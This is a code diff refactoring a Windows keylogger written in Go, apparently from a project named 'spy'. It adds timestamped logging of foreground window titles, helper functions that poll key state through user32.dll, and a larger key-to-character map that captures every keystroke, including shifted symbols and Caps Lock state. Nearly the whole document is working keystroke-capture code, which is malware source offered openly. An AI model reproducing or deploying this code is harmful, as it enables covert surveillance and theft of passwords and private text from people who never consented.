@@ -1,9 +1,12 @@
 package keylogger
 
 import (
+	"fmt"
 	"syscall"
 	"time"
 	"unsafe"
+
+	"github.com/cinus-e/spy/internal/util"
 )
 
 const (
@@ -89,6 +92,7 @@ const (
 
 var (
 	user32                   = syscall.NewLazyDLL("user32.dll")
+	procGetKeyState          = user32.NewProc("GetKeyState")
 	procGetAsyncKeyState     = user32.NewProc("GetAsyncKeyState")
 	procGetForegroundWindow  = user32.NewProc("GetForegroundWindow")
 	procGetWindowTextW       = user32.NewProc("GetWindowTextW")
@@ -124,443 +128,473 @@ func WindowLogger(data chan string) {
 		if text != "" {
 			if title != text {
 				title = text
-				data <- "\n[" + text + "]\n"
+				data <- fmt.Sprintf("\n%s[%s]\n", util.Now(), text)
 			}
 		}
 		time.Sleep(3 * time.Millisecond)
 	}
 }
 
+func isKeyDown(key int) bool {
+	state, _, _ := procGetAsyncKeyState.Call(uintptr(key))
+	if state&(1<<15) != 0 {
+		return true
+	}
+	return false
+}
+
+func capsLock() bool {
+	state, _, _ := procGetKeyState.Call(uintptr(vk_CAPITAL))
+	if state != 0 {
+		return true
+	}
+	return false
+}
+
 func KeyLogger(data chan string) {
-	var tmpKey, lastKey string
-	var shift, caps bool
+	var lastKey string
 	for {
-		tmpKey = ""
-		shiftState, _, _ := procGetAsyncKeyState.Call(uintptr(vk_SHIFT))
-		if shiftState == 0x8000 {
-			shift = true
-		} else {
-			shift = false
-		}
-		for key := 0; key < 256; key++ {
-			keyState, _, _ := procGetAsyncKeyState.Call(uintptr(key))
-			if keyState&(1<<15) != 0 && !(key < 0x2F && key != 0x20) && (key < 160 || key > 165) && (key < 91 || key > 93) {
-				switch key {
-				case vk_CONTROL:
-					tmpKey = "[Ctrl]"
-				case vk_BACK:
-					tmpKey = "[Back]"
-				case vk_TAB:
-					tmpKey = "[Tab]"
-				case vk_RETURN:
-					tmpKey = "[Enter]\r\n"
-				case vk_SHIFT:
-					tmpKey = "[Shift]"
-				case vk_MENU:
-					tmpKey = "[Alt]"
-				case vk_CAPITAL:
-					tmpKey = "[CapsLock]"
-					if caps {
-						caps = false
-					} else {
-						caps = true
-					}
-				case vk_ESCAPE:
-					tmpKey = "[Esc]"
-				case vk_SPACE:
-					tmpKey = " "
-				case vk_PRIOR:
-					tmpKey = "[PageUp]"
-				case vk_NEXT:
-					tmpKey = "[PageDown]"
-				case vk_END:
-					tmpKey = "[End]"
-				case vk_HOME:
-					tmpKey = "[Home]"
-				case vk_LEFT:
-					tmpKey = "[Left]"
-				case vk_UP:
-					tmpKey = "[Up]"
-				case vk_RIGHT:
-					tmpKey = "[Right]"
-				case vk_DOWN:
-					tmpKey = "[Down]"
-				case vk_SELECT:
-					tmpKey = "[Select]"
-				case vk_PRINT:
-					tmpKey = "[Print]"
-				case vk_EXECUTE:
-					tmpKey = "[Execute]"
-				case vk_SNAPSHOT:
-					tmpKey = "[PrintScreen]"
-				case vk_INSERT:
-					tmpKey = "[Insert]"
-				case vk_DELETE:
-					tmpKey = "[Delete]"
-				case vk_LWIN:
-					tmpKey = "[LeftWindows]"
-				case vk_RWIN:
-					tmpKey = "[RightWindows]"
-				case vk_APPS:
-					tmpKey = "[Applications]"
-				case vk_SLEEP:
-					tmpKey = "[Sleep]"
-				case vk_NUMPAD0:
-					tmpKey = "[Pad 0]"
-				case vk_NUMPAD1:
-					tmpKey = "[Pad 1]"
-				case vk_NUMPAD2:
-					tmpKey = "[Pad 2]"
-				case vk_NUMPAD3:
-					tmpKey = "[Pad 3]"
-				case vk_NUMPAD4:
-					tmpKey = "[Pad 4]"
-				case vk_NUMPAD5:
-					tmpKey = "[Pad 5]"
-				case vk_NUMPAD6:
-					tmpKey = "[Pad 6]"
-				case vk_NUMPAD7:
-					tmpKey = "[Pad 7]"
-				case vk_NUMPAD8:
-					tmpKey = "[Pad 8]"
-				case vk_NUMPAD9:
-					tmpKey = "[Pad 9]"
-				case vk_MULTIPLY:
-					tmpKey = "*"
-				case vk_ADD:
-					if shift {
-						tmpKey = "+"
-					} else {
-						tmpKey = "="
-					}
-				case vk_SEPARATOR:
-					tmpKey = "[Separator]"
-				case vk_SUBTRACT:
-					if shift {
-						tmpKey = "_"
-					} else {
-						tmpKey = "-"
-					}
-				case vk_DECIMAL:
-					tmpKey = "."
-				case vk_DIVIDE:
-					tmpKey = "[Divide]"
-				case vk_F1:
-					tmpKey = "[F1]"
-				case vk_F2:
-					tmpKey = "[F2]"
-				case vk_F3:
-					tmpKey = "[F3]"
-				case vk_F4:
-					tmpKey = "[F4]"
-				case vk_F5:
-					tmpKey = "[F5]"
-				case vk_F6:
-					tmpKey = "[F6]"
-				case vk_F7:
-					tmpKey = "[F7]"
-				case vk_F8:
-					tmpKey = "[F8]"
-				case vk_F9:
-					tmpKey = "[F9]"
-				case vk_F10:
-					tmpKey = "[F10]"
-				case vk_F11:
-					tmpKey = "[F11]"
-				case vk_F12:
-					tmpKey = "[F12]"
-				case vk_NUMLOCK:
-					tmpKey = "[NumLock]"
-				case vk_SCROLL:
-					tmpKey = "[ScrollLock]"
-				case vk_LSHIFT:
-					tmpKey = "[LeftShift]"
-				case vk_RSHIFT:
-					tmpKey = "[RightShift]"
-				case vk_LCONTROL:
-					tmpKey = "[LeftCtrl]"
-				case vk_RCONTROL:
-					tmpKey = "[RightCtrl]"
-				case vk_LMENU:
-					tmpKey = "[LeftMenu]"
-				case vk_RMENU:
-					tmpKey = "[RightMenu]"
-				case vk_OEM_1:
-					if shift {
-						tmpKey = ":"
-					} else {
-						tmpKey = ";"
-					}
-				case vk_OEM_2:
-					if shift {
-						tmpKey = "?"
-					} else {
-						tmpKey = "/"
-					}
-				case vk_OEM_3:
-					if shift {
-						tmpKey = "~"
-					} else {
-						tmpKey = "`"
-					}
-				case vk_OEM_4:
-					if shift {
-						tmpKey = "{"
-					} else {
-						tmpKey = "["
-					}
-				case vk_OEM_5:
-					if shift {
-						tmpKey = "|"
-					} else {
-						tmpKey = "\\"
-					}
-				case vk_OEM_6:
-					if shift {
-						tmpKey = "}"
-					} else {
-						tmpKey = "]"
-					}
-				case vk_OEM_7:
-					if shift {
-						tmpKey = `"`
-					} else {
-						tmpKey = "'"
-					}
-				case vk_OEM_PERIOD:
-					if shift {
-						tmpKey = ">"
-					} else {
-						tmpKey = "."
-					}
-				case 0x30:
-					if shift {
-						tmpKey = ")"
-					} else {
-						tmpKey = "0"
-					}
-				case 0x31:
-					if shift {
-						tmpKey = "!"
-					} else {
-						tmpKey = "1"
-					}
-				case 0x32:
-					if shift {
-						tmpKey = "@"
-					} else {
-						tmpKey = "2"
-					}
-				case 0x33:
-					if shift {
-						tmpKey = "#"
-					} else {
-						tmpKey = "3"
-					}
-				case 0x34:
-					if shift {
-						tmpKey = "$"
-					} else {
-						tmpKey = "4"
-					}
-				case 0x35:
-					if shift {
-						tmpKey = "%"
-					} else {
-						tmpKey = "5"
-					}
-				case 0x36:
-					if shift {
-						tmpKey = "^"
-					} else {
-						tmpKey = "6"
-					}
-				case 0x37:
-					if shift {
-						tmpKey = "&"
-					} else {
-						tmpKey = "7"
-					}
-				case 0x38:
-					if shift {
-						tmpKey = "*"
-					} else {
-						tmpKey = "8"
-					}
-				case 0x39:
-					if shift {
-						tmpKey = "("
-					} else {
-						tmpKey = "9"
-					}
-				case 0x41:
-					if caps || shift {
-						tmpKey = "A"
-					} else {
-						tmpKey = "a"
-					}
-				case 0x42:
-					if caps || shift {
-						tmpKey = "B"
-					} else {
-						tmpKey = "b"
-					}
-				case 0x43:
-					if caps || shift {
-						tmpKey = "C"
-					} else {
-						tmpKey = "c"
-					}
-				case 0x44:
-					if caps || shift {
-						tmpKey = "D"
-					} else {
-						tmpKey = "d"
-					}
-				case 0x45:
-					if caps || shift {
-						tmpKey = "E"
-					} else {
-						tmpKey = "e"
-					}
-				case 0x46:
-					if caps || shift {
-						tmpKey = "F"
-					} else {
-						tmpKey = "f"
-					}
-				case 0x47:
-					if caps || shift {
-						tmpKey = "G"
-					} else {
-						tmpKey = "g"
-					}
-				case 0x48:
-					if caps || shift {
-						tmpKey = "H"
-					} else {
-						tmpKey = "h"
-					}
-				case 0x49:
-					if caps || shift {
-						tmpKey = "I"
-					} else {
-						tmpKey = "i"
-					}
-				case 0x4A:
-					if caps || shift {
-						tmpKey = "J"
-					} else {
-						tmpKey = "j"
-					}
-				case 0x4B:
-					if caps || shift {
-						tmpKey = "K"
-					} else {
-						tmpKey = "k"
-					}
-				case 0x4C:
-					if caps || shift {
-						tmpKey = "L"
-					} else {
-						tmpKey = "l"
-					}
-				case 0x4D:
-					if caps || shift {
-						tmpKey = "M"
-					} else {
-						tmpKey = "m"
-					}
-				case 0x4E:
-					if caps || shift {
-						tmpKey = "N"
-					} else {
-						tmpKey = "n"
-					}
-				case 0x4F:
-					if caps || shift {
-						tmpKey = "O"
-					} else {
-						tmpKey = "o"
-					}
-				case 0x50:
-					if caps || shift {
-						tmpKey = "P"
-					} else {
-						tmpKey = "p"
-					}
-				case 0x51:
-					if caps || shift {
-						tmpKey = "Q"
-					} else {
-						tmpKey = "q"
-					}
-				case 0x52:
-					if caps || shift {
-						tmpKey = "R"
-					} else {
-						tmpKey = "r"
-					}
-				case 0x53:
-					if caps || shift {
-						tmpKey = "S"
-					} else {
-						tmpKey = "s"
-					}
-				case 0x54:
-					if caps || shift {
-						tmpKey = "T"
-					} else {
-						tmpKey = "t"
-					}
-				case 0x55:
-					if caps || shift {
-						tmpKey = "U"
-					} else {
-						tmpKey = "u"
-					}
-				case 0x56:
-					if caps || shift {
-						tmpKey = "V"
-					} else {
-						tmpKey = "v"
-					}
-				case 0x57:
-					if caps || shift {
-						tmpKey = "W"
-					} else {
-						tmpKey = "w"
-					}
-				case 0x58:
-					if caps || shift {
-						tmpKey = "X"
-					} else {
-						tmpKey = "x"
-					}
-				case 0x59:
-					if caps || shift {
-						tmpKey = "Y"
-					} else {
-						tmpKey = "y"
-					}
-				case 0x5A:
-					if caps || shift {
-						tmpKey = "Z"
-					} else {
-						tmpKey = "z"
-					}
-				}
-				break
-			}
-		}
-		if tmpKey != "" {
-			if tmpKey != lastKey {
-				lastKey = tmpKey
-				data <- tmpKey
+		key := getKey(capsLock(), isKeyDown(vk_SHIFT))
+		if key != "" {
+			if key != lastKey {
+				data <- key
+				lastKey = key
 			}
 		} else {
 			lastKey = ""
 		}
-		time.Sleep(10 * time.Millisecond)
+		time.Sleep(3 * time.Millisecond)
 	}
+}
+
+func getKey(caps, shift bool) string {
+	tmpKey := ""
+	for key := 0; key < 256; key++ {
+		state, _, _ := procGetAsyncKeyState.Call(uintptr(key))
+		if state&(1<<15) != 0 {
+			switch key {
+			case vk_CONTROL:
+				tmpKey = tmpKey + "[Ctrl]"
+			case vk_BACK:
+				tmpKey = tmpKey + "[Back]"
+			case vk_TAB:
+				tmpKey = tmpKey + "[Tab]"
+			case vk_CLEAR:
+				tmpKey = tmpKey + "[Clear]"
+			case vk_RETURN:
+				tmpKey = tmpKey + "[Enter]\r\n"
+			case vk_SHIFT:
+				tmpKey = tmpKey + "[Shift]"
+			case vk_MENU:
+				tmpKey = tmpKey + "[Alt]"
+			case vk_PAUSE:
+				tmpKey = tmpKey + "[pause]"
+			case vk_CAPITAL:
+				tmpKey = tmpKey + "[CapsLock]"
+			case vk_ESCAPE:
+				tmpKey = tmpKey + "[Esc]"
+			case vk_SPACE:
+				tmpKey = tmpKey + " "
+			case vk_PRIOR:
+				tmpKey = tmpKey + "[PageUp]"
+			case vk_NEXT:
+				tmpKey = tmpKey + "[PageDown]"
+			case vk_END:
+				tmpKey = tmpKey + "[End]"
+			case vk_HOME:
+				tmpKey = tmpKey + "[Home]"
+			case vk_LEFT:
+				tmpKey = tmpKey + "[Left]"
+			case vk_UP:
+				tmpKey = tmpKey + "[Up]"
+			case vk_RIGHT:
+				tmpKey = tmpKey + "[Right]"
+			case vk_DOWN:
+				tmpKey = tmpKey + "[Down]"
+			case vk_SELECT:
+				tmpKey = tmpKey + "[Select]"
+			case vk_PRINT:
+				tmpKey = tmpKey + "[Print]"
+			case vk_EXECUTE:
+				tmpKey = tmpKey + "[Execute]"
+			case vk_SNAPSHOT:
+				tmpKey = tmpKey + "[PrintScreen]"
+			case vk_INSERT:
+				tmpKey = tmpKey + "[Insert]"
+			case vk_DELETE:
+				tmpKey = tmpKey + "[Delete]"
+			case vk_LWIN:
+				tmpKey = tmpKey + "[LeftWindows]"
+			case vk_RWIN:
+				tmpKey = tmpKey + "[RightWindows]"
+			case vk_APPS:
+				tmpKey = tmpKey + "[Applications]"
+			case vk_SLEEP:
+				tmpKey = tmpKey + "[Sleep]"
+			case vk_NUMPAD0:
+				tmpKey = tmpKey + "[Pad 0]"
+			case vk_NUMPAD1:
+				tmpKey = tmpKey + "[Pad 1]"
+			case vk_NUMPAD2:
+				tmpKey = tmpKey + "[Pad 2]"
+			case vk_NUMPAD3:
+				tmpKey = tmpKey + "[Pad 3]"
+			case vk_NUMPAD4:
+				tmpKey = tmpKey + "[Pad 4]"
+			case vk_NUMPAD5:
+				tmpKey = tmpKey + "[Pad 5]"
+			case vk_NUMPAD6:
+				tmpKey = tmpKey + "[Pad 6]"
+			case vk_NUMPAD7:
+				tmpKey = tmpKey + "[Pad 7]"
+			case vk_NUMPAD8:
+				tmpKey = tmpKey + "[Pad 8]"
+			case vk_NUMPAD9:
+				tmpKey = tmpKey + "[Pad 9]"
+			case vk_MULTIPLY:
+				tmpKey = tmpKey + "*"
+			case vk_ADD:
+				if shift {
+					tmpKey = tmpKey + "+"
+				} else {
+					tmpKey = tmpKey + "="
+				}
+			case vk_SEPARATOR:
+				tmpKey = tmpKey + "[Separator]"
+			case vk_SUBTRACT:
+				if shift {
+					tmpKey = tmpKey + "_"
+				} else {
+					tmpKey = tmpKey + "-"
+				}
+			case vk_DECIMAL:
+				tmpKey = tmpKey + "."
+			case vk_DIVIDE:
+				tmpKey = tmpKey + "[Divide]"
+			case vk_F1:
+				tmpKey = tmpKey + "[F1]"
+			case vk_F2:
+				tmpKey = tmpKey + "[F2]"
+			case vk_F3:
+				tmpKey = tmpKey + "[F3]"
+			case vk_F4:
+				tmpKey = tmpKey + "[F4]"
+			case vk_F5:
+				tmpKey = tmpKey + "[F5]"
+			case vk_F6:
+				tmpKey = tmpKey + "[F6]"
+			case vk_F7:
+				tmpKey = tmpKey + "[F7]"
+			case vk_F8:
+				tmpKey = tmpKey + "[F8]"
+			case vk_F9:
+				tmpKey = tmpKey + "[F9]"
+			case vk_F10:
+				tmpKey = tmpKey + "[F10]"
+			case vk_F11:
+				tmpKey = tmpKey + "[F11]"
+			case vk_F12:
+				tmpKey = tmpKey + "[F12]"
+			case vk_NUMLOCK:
+				tmpKey = tmpKey + "[NumLock]"
+			case vk_SCROLL:
+				tmpKey = tmpKey + "[ScrollLock]"
+			case vk_LSHIFT:
+				tmpKey = tmpKey + "[LeftShift]"
+			case vk_RSHIFT:
+				tmpKey = tmpKey + "[RightShift]"
+			case vk_LCONTROL:
+				tmpKey = tmpKey + "[LeftCtrl]"
+			case vk_RCONTROL:
+				tmpKey = tmpKey + "[RightCtrl]"
+			case vk_LMENU:
+				tmpKey = tmpKey + "[LeftMenu]"
+			case vk_RMENU:
+				tmpKey = tmpKey + "[RightMenu]"
+			case vk_OEM_1:
+				if shift {
+					tmpKey = tmpKey + ":"
+				} else {
+					tmpKey = tmpKey + ";"
+				}
+			case vk_OEM_2:
+				if shift {
+					tmpKey = tmpKey + "?"
+				} else {
+					tmpKey = tmpKey + "/"
+				}
+			case vk_OEM_3:
+				if shift {
+					tmpKey = tmpKey + "~"
+				} else {
+					tmpKey = tmpKey + "`"
+				}
+			case vk_OEM_4:
+				if shift {
+					tmpKey = tmpKey + "{"
+				} else {
+					tmpKey = tmpKey + "["
+				}
+			case vk_OEM_5:
+				if shift {
+					tmpKey = tmpKey + "|"
+				} else {
+					tmpKey = tmpKey + "\\"
+				}
+			case vk_OEM_6:
+				if shift {
+					tmpKey = tmpKey + "}"
+				} else {
+					tmpKey = tmpKey + "]"
+				}
+			case vk_OEM_7:
+				if shift {
+					tmpKey = tmpKey + `"`
+				} else {
+					tmpKey = tmpKey + "'"
+				}
+			case vk_OEM_PLUS:
+				if shift {
+					tmpKey = tmpKey + "+"
+				} else {
+					tmpKey = tmpKey + "="
+				}
+			case vk_OEM_MINUS:
+				if shift {
+					tmpKey = tmpKey + "_"
+				} else {
+					tmpKey = tmpKey + "-"
+				}
+			case vk_OEM_COMMA:
+				if shift {
+					tmpKey = tmpKey + "<"
+				} else {
+					tmpKey = tmpKey + ","
+				}
+			case vk_OEM_PERIOD:
+				if shift {
+					tmpKey = tmpKey + ">"
+				} else {
+					tmpKey = tmpKey + "."
+				}
+			case 0x30:
+				if shift {
+					tmpKey = tmpKey + ")"
+				} else {
+					tmpKey = tmpKey + "0"
+				}
+			case 0x31:
+				if shift {
+					tmpKey = tmpKey + "!"
+				} else {
+					tmpKey = tmpKey + "1"
+				}
+			case 0x32:
+				if shift {
+					tmpKey = tmpKey + "@"
+				} else {
+					tmpKey = tmpKey + "2"
+				}
+			case 0x33:
+				if shift {
+					tmpKey = tmpKey + "#"
+				} else {
+					tmpKey = tmpKey + "3"
+				}
+			case 0x34:
+				if shift {
+					tmpKey = tmpKey + "$"
+				} else {
+					tmpKey = tmpKey + "4"
+				}
+			case 0x35:
+				if shift {
+					tmpKey = tmpKey + "%"
+				} else {
+					tmpKey = tmpKey + "5"
+				}
+			case 0x36:
+				if shift {
+					tmpKey = tmpKey + "^"
+				} else {
+					tmpKey = tmpKey + "6"
+				}
+			case 0x37:
+				if shift {
+					tmpKey = tmpKey + "&"
+				} else {
+					tmpKey = tmpKey + "7"
+				}
+			case 0x38:
+				if shift {
+					tmpKey = tmpKey + "*"
+				} else {
+					tmpKey = tmpKey + "8"
+				}
+			case 0x39:
+				if shift {
+					tmpKey = tmpKey + "("
+				} else {
+					tmpKey = tmpKey + "9"
+				}
+			case 0x41:
+				if caps || shift {
+					tmpKey = tmpKey + "A"
+				} else {
+					tmpKey = tmpKey + "a"
+				}
+			case 0x42:
+				if caps || shift {
+					tmpKey = tmpKey + "B"
+				} else {
+					tmpKey = tmpKey + "b"
+				}
+			case 0x43:
+				if caps || shift {
+					tmpKey = tmpKey + "C"
+				} else {
+					tmpKey = tmpKey + "c"
+				}
+			case 0x44:
+				if caps || shift {
+					tmpKey = tmpKey + "D"
+				} else {
+					tmpKey = tmpKey + "d"
+				}
+			case 0x45:
+				if caps || shift {
+					tmpKey = tmpKey + "E"
+				} else {
+					tmpKey = tmpKey + "e"
+				}
+			case 0x46:
+				if caps || shift {
+					tmpKey = tmpKey + "F"
+				} else {
+					tmpKey = tmpKey + "f"
+				}
+			case 0x47:
+				if caps || shift {
+					tmpKey = tmpKey + "G"
+				} else {
+					tmpKey = tmpKey + "g"
+				}
+			case 0x48:
+				if caps || shift {
+					tmpKey = tmpKey + "H"
+				} else {
+					tmpKey = tmpKey + "h"
+				}
+			case 0x49:
+				if caps || shift {
+					tmpKey = tmpKey + "I"
+				} else {
+					tmpKey = tmpKey + "i"
+				}
+			case 0x4A:
+				if caps || shift {
+					tmpKey = tmpKey + "J"
+				} else {
+					tmpKey = tmpKey + "j"
+				}
+			case 0x4B:
+				if caps || shift {
+					tmpKey = tmpKey + "K"
+				} else {
+					tmpKey = tmpKey + "k"
+				}
+			case 0x4C:
+				if caps || shift {
+					tmpKey = tmpKey + "L"
+				} else {
+					tmpKey = tmpKey + "l"
+				}
+			case 0x4D:
+				if caps || shift {
+					tmpKey = tmpKey + "M"
+				} else {
+					tmpKey = tmpKey + "m"
+				}
+			case 0x4E:
+				if caps || shift {
+					tmpKey = tmpKey + "N"
+				} else {
+					tmpKey = tmpKey + "n"
+				}
+			case 0x4F:
+				if caps || shift {
+					tmpKey = tmpKey + "O"
+				} else {
+					tmpKey = tmpKey + "o"
+				}
+			case 0x50:
+				if caps || shift {
+					tmpKey = tmpKey + "P"
+				} else {
+					tmpKey = tmpKey + "p"
+				}
+			case 0x51:
+				if caps || shift {
+					tmpKey = tmpKey + "Q"
+				} else {
+					tmpKey = tmpKey + "q"
+				}
+			case 0x52:
+				if caps || shift {
+					tmpKey = tmpKey + "R"
+				} else {
+					tmpKey = tmpKey + "r"
+				}
+			case 0x53:
+				if caps || shift {
+					tmpKey = tmpKey + "S"
+				} else {
+					tmpKey = tmpKey + "s"
+				}
+			case 0x54:
+				if caps || shift {
+					tmpKey = tmpKey + "T"
+				} else {
+					tmpKey = tmpKey + "t"
+				}
+			case 0x55:
+				if caps || shift {
+					tmpKey = tmpKey + "U"
+				} else {
+					tmpKey = tmpKey + "u"
+				}
+			case 0x56:
+				if caps || shift {
+					tmpKey = tmpKey + "V"
+				} else {
+					tmpKey = tmpKey + "v"
+				}
+			case 0x57:
+				if caps || shift {
+					tmpKey = tmpKey + "W"
+				} else {
+					tmpKey = tmpKey + "w"
+				}
+			case 0x58:
+				if caps || shift {
+					tmpKey = tmpKey + "X"
+				} else {
+					tmpKey = tmpKey + "x"
+				}
+			case 0x59:
+				if caps || shift {
+					tmpKey = tmpKey + "Y"
+				} else {
+					tmpKey = tmpKey + "y"
+				}
+			case 0x5A:
+				if caps || shift {
+					tmpKey = tmpKey + "Z"
+				} else {
+					tmpKey = tmpKey + "z"
+				}
+			}
+		}
+	}
+	return tmpKey
 }
